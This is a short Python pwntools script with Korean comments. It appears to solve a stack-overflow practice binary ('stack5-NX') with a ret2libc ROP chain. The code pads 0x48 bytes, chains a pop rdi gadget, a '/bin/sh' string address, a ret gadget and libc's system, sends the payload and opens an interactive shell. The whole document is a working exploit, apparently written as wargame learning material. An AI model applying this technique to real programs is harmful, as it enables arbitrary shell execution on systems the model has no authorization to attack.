from pwn import *

p = process('./stack5-NX')

pop_rdi_ret = 0x401203  #   가젯으로 이용할 pop rdi 주소
binsh = 0x7ffff7dcb42f  #   system 함수에 집어넣을 인자 값인 문자열 "/bin/sh" 의 주소
ret = 0x40101a  #   가젯으로 이용할 ret 주소
libc_system = 0x7ffff7c58750    #  libc에 저장된 system 함수 주소

#   'A'로 덮고, 페이로드에 위에서 얻은 주소 차례대로 넣기
payload = b'A' * 0x48
payload += p64(pop_rdi_ret)
payload += p64(binsh)
payload += p64(ret)
payload += p64(libc_system)

p.recvline()
p.sendline(payload) #   페이로드 실행

p.interactive()